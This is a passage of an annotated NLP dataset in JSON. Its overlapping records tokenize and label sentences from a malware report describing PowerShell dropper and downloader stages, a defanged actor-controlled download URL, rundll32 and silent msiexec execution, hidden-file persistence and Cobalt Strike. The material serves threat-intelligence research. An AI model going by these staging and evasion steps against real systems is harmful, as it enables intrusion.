"sent_id": 6, "global_pos": [169, 169], "name": "script", "pos": [18, 19], "index": "13_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [172, 172], "name": "payload", "pos": [21, 22], "index": "14_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [183, 183], "name": "https [ : // ] bitbucket.org/atlasover/atlassiancore/downloads/newmodeler.dll", "pos": [32, 38], "index": "15_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [200, 200], "name": "script", "pos": [1, 2], "index": "16_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [211, 211], "name": "payload file", "pos": [12, 14], "index": "17_0"}]], "labels": [{"r": "EX", "evidence": [0], "t": 0, "h": 1}, {"r": "EX", "evidence": [1, 2], "t": 3, "h": 4}, {"r": "WR", "evidence": [2, 3], "h": 4, "t": 5}, {"r": "WR", "evidence": [2, 3], "h": 4, "t": 6}, {"r": "WR", "evidence": [2, 3, 4], "h": 4, "t": 7}, {"r": "FR", "evidence": [4, 5], "h": 8, "t": 9}, {"r": "EX", "evidence": [4, 5], "t": 7, "h": 9}, {"r": "WR", "evidence": [5], "h": 9, "t": 10}, {"r": "WR", "evidence": [5], "h": 9, "t": 11}, {"r": "WR", "evidence": [5], "h": 9, "t": 12}, {"r": "CO", "evidence": [5, 6], "h": 9, "t": 13}, {"r": "CO", "evidence": [5, 6, 7], "h": 9, "t": 16}, {"r": "WR", "evidence": [6], "h": 13, "t": 14}, {"r": "ST", "evidence": [6], "h": 13, "t": 15}, {"r": "RF", "evidence": [6], "h": 13, "t": 15}]}, {"title": "063-13", "sents": [["An", "array", "of", "the", "encoded", "data", "will", "be", "decoded", "to", "a", "PowerShell", "script", ",", "which", "is", "generated", "in", "the", "victim", "'s", "system", "memory", "and", "executed", "."], ["Stage", "4", "PowerShell", "scriptThe", "PowerShell", "dropper", "script", "executed", "in", "the", "victim", "'s", "system", "memory", "contains", "an", "AES-encrypted", "data", "blob", "as", "a", "base64-encoded", "string", "and", "another", "base64-encoded", "string", "of", "a", "decryption", "key", "."], ["The", "encoded", "strings", "are", "converted", "to", "generate", "the", "AES", "encrypted", "data", "block", "and", "the", "256-bit", "AES", "decryption", "key", "."], ["Using", "the", "decryption", "key", ",", "the", "encrypted", "data", "generates", "a", "PowerShell", "downloader", "script", ",", "which", "is", "executed", "using", "the", "PowerShell", "IEX", "function", "."], ["Stage", "5", "PowerShell", "downloaderThe", "PowerShell", "downloader", "script", "is", "obfuscated", "and", "contains", "encoded", "blocks", "that", "are", "decoded", "to", "generate", "the", "download", "URL", ",", "file", "execution", "path", "and", "file", "extensions", "."], ["The", "following", "actions", "are", "performed", "by", "the", "script", "upon", "its", "execution", "in", "victim", "'s", "system", "memory", ":", "The", "script", "downloads", "the", "payload", "from", "the", "actor", "controlled", "remote", "location", "through", "the", "URL", "``", "https", "[", ":", "//", "]", "bitbucket.org/atlasover/atlassiancore/downloads/newmodeler.dll", "''", "to", "the", "user", "profile", "local", "application", "temporary", "folder", "."], ["The", "script", "performs", "a", "check", "on", "the", "file", "extension", "of", "the", "downloaded", "payload", "file", "."], ["If", "the", "payload", "has", "the", "extension", ".dll", ",", "the", "script", "will", "run", "the", "DLL", "using", "rundll32.exe", "exhibiting", "the", "use", "of", "sideloading", "technique", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [5, 5], "name": "data", "pos": [5, 6], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [12, 12], "name": "script", "pos": [12, 13], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [32, 32], "name": "script", "pos": [6, 7], "index": "2_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [68, 68], "name": "data block", "pos": [10, 12], "index": "3_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [75, 75], "name": "key", "pos": [17, 18], "index": "4_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [89, 89], "name": "script", "pos": [12, 13], "index": "5_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [96, 96], "name": "PowerShell", "pos": [19, 20], "index": "6_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [106, 106], "name": "script", "pos": [6, 7], "index": "7_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [119, 119], "name": "download URL", "pos": [19, 21], "index": "8_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [122, 122], "name": "file execution path", "pos": [22, 25], "index": "9_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [126, 126], "name": "file extensions", "pos": [26, 28], "index": "10_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [147, 147], "name": "script", "pos": [18, 19], "index": "11_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [150, 150], "name": "payload", "pos": [21, 22], "index": "12_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [161, 161], "name": "https [ : // ] bitbucket.org/atlasover/atlassiancore/downloads/newmodeler.dll", "pos": [32, 38], "index": "13_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [178, 178], "name": "script", "pos": [1, 2], "index": "14_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [189, 189], "name": "payload file", "pos": [12, 14], "index": "15_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [198, 198], "name": ".dll", "pos": [6, 7], "index": "16_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [201, 201], "name": "script", "pos": [9, 10], "index": "17_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [205, 205], "name": "DLL", "pos": [13, 14], "index": "18_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [207, 207], "name": "rundll32.exe", "pos": [15, 16], "index": "19_0"}]], "labels": [{"r": "EX", "evidence": [0, 1], "t": 1, "h": 2}, {"r": "WR", "evidence": [1, 2], "h": 2, "t": 3}, {"r": "WR", "evidence": [1, 2], "h": 2, "t": 4}, {"r": "WR", "evidence": [1, 2, 3], "h": 2, "t": 5}, {"r": "FR", "evidence": [3, 4], "h": 6, "t": 7}, {"r": "EX", "evidence": [3, 4], "t": 5, "h": 7}, {"r": "WR", "evidence": [4], "h": 7, "t": 8}, {"r": "WR", "evidence": [4], "h": 7, "t": 9}, {"r": "WR", "evidence": [4], "h": 7, "t": 10}, {"r": "WR", "evidence": [4, 5, 6, 7], "h": 7, "t": 16}, {"r": "CO", "evidence": [4, 5], "h": 7, "t": 11}, {"r": "CO", "evidence": [4, 5, 6], "h": 7, "t": 14}, {"r": "CO", "evidence": [4, 5, 6, 7], "h": 7, "t": 17}, {"r": "WR", "evidence": [5], "h": 11, "t": 12}, {"r": "ST", "evidence": [5], "h": 11, "t": 13}, {"r": "RF", "evidence": [5], "h": 11, "t": 13}, {"r": "CO", "evidence": [6, 7], "h": 15, "t": 18}, {"r": "FR", "evidence": [7], "h": 17, "t": 19}, {"r": "EX", "evidence": [7], "t": 18, "h": 19}, {"r": "WR", "evidence": [7], "t": 16, "h": 19}]}, {"title": "063-14", "sents": [["Stage", "4", "PowerShell", "scriptThe", "PowerShell", "dropper", "script", "executed", "in", "the", "victim", "'s", "system", "memory", "contains", "an", "AES-encrypted", "data", "blob", "as", "a", "base64-encoded", "string", "and", "another", "base64-encoded", "string", "of", "a", "decryption", "key", "."], ["The", "encoded", "strings", "are", "converted", "to", "generate", "the", "AES", "encrypted", "data", "block", "and", "the", "256-bit", "AES", "decryption", "key", "."], ["Using", "the", "decryption", "key", ",", "the", "encrypted", "data", "generates", "a", "PowerShell", "downloader", "script", ",", "which", "is", "executed", "using", "the", "PowerShell", "IEX", "function", "."], ["Stage", "5", "PowerShell", "downloaderThe", "PowerShell", "downloader", "script", "is", "obfuscated", "and", "contains", "encoded", "blocks", "that", "are", "decoded", "to", "generate", "the", "download", "URL", ",", "file", "execution", "path", "and", "file", "extensions", "."], ["The", "following", "actions", "are", "performed", "by", "the", "script", "upon", "its", "execution", "in", "victim", "'s", "system", "memory", ":", "The", "script", "downloads", "the", "payload", "from", "the", "actor", "controlled", "remote", "location", "through", "the", "URL", "``", "https", "[", ":", "//", "]", "bitbucket.org/atlasover/atlassiancore/downloads/newmodeler.dll", "''", "to", "the", "user", "profile", "local", "application", "temporary", "folder", "."], ["The", "script", "performs", "a", "check", "on", "the", "file", "extension", "of", "the", "downloaded", "payload", "file", "."], ["If", "the", "payload", "has", "the", "extension", ".dll", ",", "the", "script", "will", "run", "the", "DLL", "using", "rundll32.exe", "exhibiting", "the", "use", "of", "sideloading", "technique", "."], ["If", "the", "payload", "has", "an", "MSI", "file", "extension", ",", "the", "payload", "is", "executed", "using", "the", "command", "''", "msiexec", "/quiet", "/i", "<", "payload", ">", "''", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [6, 6], "name": "script", "pos": [6, 7], "index": "0_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [42, 42], "name": "data block", "pos": [10, 12], "index": "1_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [49, 49], "name": "key", "pos": [17, 18], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [63, 63], "name": "script", "pos": [12, 13], "index": "3_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [70, 70], "name": "PowerShell", "pos": [19, 20], "index": "4_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [80, 80], "name": "script", "pos": [6, 7], "index": "5_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [93, 93], "name": "download URL", "pos": [19, 21], "index": "6_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [96, 96], "name": "file execution path", "pos": [22, 25], "index": "7_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [100, 100], "name": "file extensions", "pos": [26, 28], "index": "8_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [121, 121], "name": "script", "pos": [18, 19], "index": "9_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [124, 124], "name": "payload", "pos": [21, 22], "index": "10_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [135, 135], "name": "https [ : // ] bitbucket.org/atlasover/atlassiancore/downloads/newmodeler.dll", "pos": [32, 38], "index": "11_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [152, 152], "name": "script", "pos": [1, 2], "index": "12_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [163, 163], "name": "payload file", "pos": [12, 14], "index": "13_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [172, 172], "name": ".dll", "pos": [6, 7], "index": "14_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [175, 175], "name": "script", "pos": [9, 10], "index": "15_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [179, 179], "name": "DLL", "pos": [13, 14], "index": "16_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [181, 181], "name": "rundll32.exe", "pos": [15, 16], "index": "17_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [191, 191], "name": "payload", "pos": [2, 3], "index": "18_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [199, 199], "name": "payload", "pos": [10, 11], "index": "19_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [206, 206], "name": "msiexec", "pos": [17, 18], "index": "20_0"}]], "labels": [{"r": "WR", "evidence": [0, 1], "h": 0, "t": 1}, {"r": "WR", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "WR", "evidence": [0, 1, 2], "h": 0, "t": 3}, {"r": "FR", "evidence": [2, 3], "h": 4, "t": 5}, {"r": "EX", "evidence": [2, 3], "t": 3, "h": 5}, {"r": "WR", "evidence": [3], "h": 5, "t": 6}, {"r": "WR", "evidence": [3], "h": 5, "t": 7}, {"r": "WR", "evidence": [3], "h": 5, "t": 8}, {"r": "WR", "evidence": [3, 4, 5, 6], "h": 5, "t": 14}, {"r": "CO", "evidence": [3, 4], "h": 5, "t": 9}, {"r": "CO", "evidence": [3, 4, 5], "h": 5, "t": 12}, {"r": "CO", "evidence": [3, 4, 5, 6], "h": 5, "t": 15}, {"r": "WR", "evidence": [4], "h": 9, "t": 10}, {"r": "ST", "evidence": [4], "h": 9, "t": 11}, {"r": "RF", "evidence": [4], "h": 9, "t": 11}, {"r": "CO", "evidence": [5, 6], "h": 13, "t": 16}, {"r": "CO", "evidence": [5, 6, 7], "h": 13, "t": 18}, {"r": "CO", "evidence": [5, 6, 7], "h": 13, "t": 19}, {"r": "FR", "evidence": [6], "h": 15, "t": 17}, {"r": "EX", "evidence": [6], "t": 16, "h": 17}, {"r": "FR", "evidence": [6, 7], "h": 15, "t": 20}, {"r": "WR", "evidence": [6], "t": 14, "h": 17}, {"r": "EX", "evidence": [7], "t": 19, "h": 20}]}, {"title": "063-15", "sents": [["The", "encoded", "strings", "are", "converted", "to", "generate", "the", "AES", "encrypted", "data", "block", "and", "the", "256-bit", "AES", "decryption", "key", "."], ["Using", "the", "decryption", "key", ",", "the", "encrypted", "data", "generates", "a", "PowerShell", "downloader", "script", ",", "which", "is", "executed", "using", "the", "PowerShell", "IEX", "function", "."], ["Stage", "5", "PowerShell", "downloaderThe", "PowerShell", "downloader", "script", "is", "obfuscated", "and", "contains", "encoded", "blocks", "that", "are", "decoded", "to", "generate", "the", "download", "URL", ",", "file", "execution", "path", "and", "file", "extensions", "."], ["The", "following", "actions", "are", "performed", "by", "the", "script", "upon", "its", "execution", "in", "victim", "'s", "system", "memory", ":", "The", "script", "downloads", "the", "payload", "from", "the", "actor", "controlled", "remote", "location", "through", "the", "URL", "``", "https", "[", ":", "//", "]", "bitbucket.org/atlasover/atlassiancore/downloads/newmodeler.dll", "''", "to", "the", "user", "profile", "local", "application", "temporary", "folder", "."], ["The", "script", "performs", "a", "check", "on", "the", "file", "extension", "of", "the", "downloaded", "payload", "file", "."], ["If", "the", "payload", "has", "the", "extension", ".dll", ",", "the", "script", "will", "run", "the", "DLL", "using", "rundll32.exe", "exhibiting", "the", "use", "of", "sideloading", "technique", "."], ["If", "the", "payload", "has", "an", "MSI", "file", "extension", ",", "the", "payload", "is", "executed", "using", "the", "command", "''", "msiexec", "/quiet", "/i", "<", "payload", ">", "''", "."], ["If", "the", "payload", "is", "an", "EXE", "file", ",", "then", "it", "will", "run", "it", "as", "a", "process", "using", "the", "PowerShell", "commandletStart-Process", "."]], "vertexSet": [[{"type": "TF", "sent_id": 0, "global_pos": [10, 10], "name": "data block", "pos": [10, 12], "index": "0_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [17, 17], "name": "key", "pos": [17, 18], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [31, 31], "name": "script", "pos": [12, 13], "index": "2_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [38, 38], "name": "PowerShell", "pos": [19, 20], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [48, 48], "name": "script", "pos": [6, 7], "index": "4_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [61, 61], "name": "download URL", "pos": [19, 21], "index": "5_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [64, 64], "name": "file execution path", "pos": [22, 25], "index": "6_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [68, 68], "name": "file extensions", "pos": [26, 28], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [89, 89], "name": "script", "pos": [18, 19], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [92, 92], "name": "payload", "pos": [21, 22], "index": "9_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [103, 103], "name": "https [ : // ] bitbucket.org/atlasover/atlassiancore/downloads/newmodeler.dll", "pos": [32, 38], "index": "10_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [120, 120], "name": "script", "pos": [1, 2], "index": "11_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [131, 131], "name": "payload file", "pos": [12, 14], "index": "12_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [140, 140], "name": ".dll", "pos": [6, 7], "index": "13_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [143, 143], "name": "script", "pos": [9, 10], "index": "14_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [147, 147], "name": "DLL", "pos": [13, 14], "index": "15_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [149, 149], "name": "rundll32.exe", "pos": [15, 16], "index": "16_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [159, 159], "name": "payload", "pos": [2, 3], "index": "17_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [167, 167], "name": "payload", "pos": [10, 11], "index": "18_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [174, 174], "name": "msiexec", "pos": [17, 18], "index": "19_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [184, 184], "name": "payload", "pos": [2, 3], "index": "20_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [191, 191], "name": "it", "pos": [9, 10], "index": "21_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [194, 194], "name": "it", "pos": [12, 13], "index": "22_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [200, 200], "name": "PowerShell", "pos": [18, 19], "index": "23_0"}]], "labels": [{"r": "FR", "evidence": [1, 2], "h": 3, "t": 4}, {"r": "EX", "evidence": [1, 2], "t": 2, "h": 4}, {"r": "WR", "evidence": [2], "h": 4, "t": 5}, {"r": "WR", "evidence": [2], "h": 4, "t": 6}, {"r": "WR", "evidence": [2], "h": 4, "t": 7}, {"r": "WR", "evidence": [2, 3, 4, 5], "h": 4, "t": 13}, {"r": "CO", "evidence": [2, 3], "h": 4, "t": 8}, {"r": "CO", "evidence": [2, 3, 4], "h": 4, "t": 11}, {"r": "CO", "evidence": [2, 3, 4, 5], "h": 4, "t": 14}, {"r": "CO", "evidence": [2, 3, 4, 5, 6, 7], "h": 4, "t": 21}, {"r": "WR", "evidence": [3], "h": 8, "t": 9}, {"r": "ST", "evidence": [3], "h": 8, "t": 10}, {"r": "RF", "evidence": [3], "h": 8, "t": 10}, {"r": "CO", "evidence": [4, 5], "h": 12, "t": 15}, {"r": "CO", "evidence": [4, 5, 6], "h": 12, "t": 17}, {"r": "CO", "evidence": [4, 5, 6], "h": 12, "t": 18}, {"r": "CO", "evidence": [4, 5, 6, 7], "h": 12, "t": 22}, {"r": "CO", "evidence": [4, 5, 6, 7], "h": 12, "t": 20}, {"r": "FR", "evidence": [5], "h": 14, "t": 16}, {"r": "EX", "evidence": [5], "t": 15, "h": 16}, {"r": "FR", "evidence": [5, 6], "h": 14, "t": 19}, {"r": "WR", "evidence": [5], "t": 13, "h": 16}, {"r": "EX", "evidence": [6], "t": 18, "h": 19}, {"r": "FR", "evidence": [7], "h": 21, "t": 23}, {"r": "EX", "evidence": [7], "t": 22, "h": 23}]}, {"title": "063-16", "sents": [["Using", "the", "decryption", "key", ",", "the", "encrypted", "data", "generates", "a", "PowerShell", "downloader", "script", ",", "which", "is", "executed", "using", "the", "PowerShell", "IEX", "function", "."], ["Stage", "5", "PowerShell", "downloaderThe", "PowerShell", "downloader", "script", "is", "obfuscated", "and", "contains", "encoded", "blocks", "that", "are", "decoded", "to", "generate", "the", "download", "URL", ",", "file", "execution", "path", "and", "file", "extensions", "."], ["The", "following", "actions", "are", "performed", "by", "the", "script", "upon", "its", "execution", "in", "victim", "'s", "system", "memory", ":", "The", "script", "downloads", "the", "payload", "from", "the", "actor", "controlled", "remote", "location", "through", "the", "URL", "``", "https", "[", ":", "//", "]", "bitbucket.org/atlasover/atlassiancore/downloads/newmodeler.dll", "''", "to", "the", "user", "profile", "local", "application", "temporary", "folder", "."], ["The", "script", "performs", "a", "check", "on", "the", "file", "extension", "of", "the", "downloaded", "payload", "file", "."], ["If", "the", "payload", "has", "the", "extension", ".dll", ",", "the", "script", "will", "run", "the", "DLL", "using", "rundll32.exe", "exhibiting", "the", "use", "of", "sideloading", "technique", "."], ["If", "the", "payload", "has", "an", "MSI", "file", "extension", ",", "the", "payload", "is", "executed", "using", "the", "command", "''", "msiexec", "/quiet", "/i", "<", "payload", ">", "''", "."], ["If", "the", "payload", "is", "an", "EXE", "file", ",", "then", "it", "will", "run", "it", "as", "a", "process", "using", "the", "PowerShell", "commandletStart-Process", "."], ["Upon", "running", "the", "payload", ",", "the", "script", "will", "hide", "the", "payload", "file", "to", "establish", "persistence", "by", "setting", "the", "``", "hidden", "''", "file", "system", "attribute", "of", "the", "payload", "file", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [12, 12], "name": "script", "pos": [12, 13], "index": "0_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [19, 19], "name": "PowerShell", "pos": [19, 20], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [29, 29], "name": "script", "pos": [6, 7], "index": "2_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [42, 42], "name": "download URL", "pos": [19, 21], "index": "3_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [45, 45], "name": "file execution path", "pos": [22, 25], "index": "4_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [49, 49], "name": "file extensions", "pos": [26, 28], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [70, 70], "name": "script", "pos": [18, 19], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [73, 73], "name": "payload", "pos": [21, 22], "index": "7_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [84, 84], "name": "https [ : // ] bitbucket.org/atlasover/atlassiancore/downloads/newmodeler.dll", "pos": [32, 38], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [101, 101], "name": "script", "pos": [1, 2], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [112, 112], "name": "payload file", "pos": [12, 14], "index": "10_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [121, 121], "name": ".dll", "pos": [6, 7], "index": "11_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [124, 124], "name": "script", "pos": [9, 10], "index": "12_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [128, 128], "name": "DLL", "pos": [13, 14], "index": "13_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [130, 130], "name": "rundll32.exe", "pos": [15, 16], "index": "14_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [140, 140], "name": "payload", "pos": [2, 3], "index": "15_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [148, 148], "name": "payload", "pos": [10, 11], "index": "16_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [155, 155], "name": "msiexec", "pos": [17, 18], "index": "17_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [165, 165], "name": "payload", "pos": [2, 3], "index": "18_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [172, 172], "name": "it", "pos": [9, 10], "index": "19_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [175, 175], "name": "it", "pos": [12, 13], "index": "20_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [181, 181], "name": "PowerShell", "pos": [18, 19], "index": "21_0"}]], "labels": [{"r": "FR", "evidence": [0, 1], "h": 1, "t": 2}, {"r": "EX", "evidence": [0, 1], "t": 0, "h": 2}, {"r": "WR", "evidence": [1], "h": 2, "t": 3}, {"r": "WR", "evidence": [1], "h": 2, "t": 4}, {"r": "WR", "evidence": [1], "h": 2, "t": 5}, {"r": "WR", "evidence": [1, 2, 3, 4], "h": 2, "t": 11}, {"r": "CO", "evidence": [1, 2], "h": 2, "t": 6}, {"r": "CO", "evidence": [1, 2, 3], "h": 2, "t": 9}, {"r": "CO", "evidence": [1, 2, 3, 4], "h": 2, "t": 12}, {"r": "CO", "evidence": [1, 2, 3, 4, 5, 6], "h": 2, "t": 19}, {"r": "WR", "evidence": [2], "h": 6, "t": 7}, {"r": "ST", "evidence": [2], "h": 6, "t": 8}, {"r": "RF", "evidence": [2], "h": 6, "t": 8}, {"r": "CO", "evidence": [3, 4], "h": 10, "t": 13}, {"r": "CO", "evidence": [3, 4, 5], "h": 10, "t": 15}, {"r": "CO", "evidence": [3, 4, 5], "h": 10, "t": 16}, {"r": "CO", "evidence": [3, 4, 5, 6], "h": 10, "t": 20}, {"r": "CO", "evidence": [3, 4, 5, 6], "h": 10, "t": 18}, {"r": "FR", "evidence": [4], "h": 12, "t": 14}, {"r": "EX", "evidence": [4], "t": 13, "h": 14}, {"r": "FR", "evidence": [4, 5], "h": 12, "t": 17}, {"r": "WR", "evidence": [4], "t": 11, "h": 14}, {"r": "EX", "evidence": [5], "t": 16, "h": 17}, {"r": "FR", "evidence": [6], "h": 19, "t": 21}, {"r": "EX", "evidence": [6], "t": 20, "h": 21}]}, {"title": "063-17", "sents": [["Stage", "5", "PowerShell", "downloaderThe", "PowerShell", "downloader", "script", "is", "obfuscated", "and", "contains", "encoded", "blocks", "that", "are", "decoded", "to", "generate", "the", "download", "URL", ",", "file", "execution", "path", "and", "file", "extensions", "."], ["The", "following", "actions", "are", "performed", "by", "the", "script", "upon", "its", "execution", "in", "victim", "'s", "system", "memory", ":", "The", "script", "downloads", "the", "payload", "from", "the", "actor", "controlled", "remote", "location", "through", "the", "URL", "``", "https", "[", ":", "//", "]", "bitbucket.org/atlasover/atlassiancore/downloads/newmodeler.dll", "''", "to", "the", "user", "profile", "local", "application", "temporary", "folder", "."], ["The", "script", "performs", "a", "check", "on", "the", "file", "extension", "of", "the", "downloaded", "payload", "file", "."], ["If", "the", "payload", "has", "the", "extension", ".dll", ",", "the", "script", "will", "run", "the", "DLL", "using", "rundll32.exe", "exhibiting", "the", "use", "of", "sideloading", "technique", "."], ["If", "the", "payload", "has", "an", "MSI", "file", "extension", ",", "the", "payload", "is", "executed", "using", "the", "command", "''", "msiexec", "/quiet", "/i", "<", "payload", ">", "''", "."], ["If", "the", "payload", "is", "an", "EXE", "file", ",", "then", "it", "will", "run", "it", "as", "a", "process", "using", "the", "PowerShell", "commandletStart-Process", "."], ["Upon", "running", "the", "payload", ",", "the", "script", "will", "hide", "the", "payload", "file", "to", "establish", "persistence", "by", "setting", "the", "``", "hidden", "''", "file", "system", "attribute", "of", "the", "payload", "file", "."], ["We", "spotted", "that", ",", "in", "the", "attack", "chain", ",", "the", "actor", "employed", "a", "64-bit", "Windows", "executable", "downloader", "which", "executes", "the", "PowerShell", "commands", "responsible", "for", "downloading", "and", "running", "the", "Cobalt", "Strike", "payload", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [6, 6], "name": "script", "pos": [6, 7], "index": "0_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [19, 19], "name": "download URL", "pos": [19, 21], "index": "1_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [22, 22], "name": "file execution path", "pos": [22, 25], "index": "2_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [26, 26], "name": "file extensions", "pos": [26, 28], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [47, 47], "name": "script", "pos": [18, 19], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [50, 50], "name": "payload", "pos": [21, 22], "index": "5_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [61, 61], "name": "https [ : // ] bitbucket.org/atlasover/atlassiancore/downloads/newmodeler.dll", "pos": [32, 38], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [78, 78], "name": "script", "pos": [1, 2], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [89, 89], "name": "payload file", "pos": [12, 14], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [98, 98], "name": ".dll", "pos": [6, 7], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [101, 101], "name": "script", "pos": [9, 10], "index": "10_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [105, 105], "name": "DLL", "pos": [13, 14], "index": "11_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [107, 107], "name": "rundll32.exe", "pos": [15, 16], "index": "12_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [117, 117], "name": "payload", "pos": [2, 3], "index": "13_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [125, 125], "name": "payload", "pos": [10, 11], "index": "14_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [132, 132], "name": "msiexec", "pos": [17, 18], "index": "15_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [142, 142], "name": "payload", "pos": [2, 3], "index": "16_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [149, 149], "name": "it", "pos": [9, 10], "index": "17_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [152, 152], "name": "it", "pos": [12, 13], "index": "18_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [158, 158], "name": "PowerShell", "pos": [18, 19], "index": "19_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [200, 200], "name": "actor", "pos": [10, 11], "index": "20_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [206, 206], "name": "downloader", "pos": [16, 17], "index": "21_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [210, 210], "name": "PowerShell", "pos": [20, 21], "index": "22_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [220, 220], "name": "payload", "pos": [30, 31], "index": "23_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 2}, {"r": "WR", "evidence": [0], "h": 0, "t": 3}, {"r": "WR", "evidence": [0, 1, 2, 3], "h": 0, "t": 9}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 4}, {"r": "CO", "evidence": [0, 1, 2], "h": 0, "t": 7}, {"r": "CO", "evidence": [0, 1, 2, 3], "h": 0, "t": 10}, {"r": "CO", "evidence": [0, 1, 2, 3, 4, 5], "h": 0, "t": 17}, {"r": "WR", "evidence": [1], "h": 4, "t": 5}, {"r": "ST", "evidence": [1], "h": 4, "t": 6}, {"r": "RF", "evidence": [1], "h": 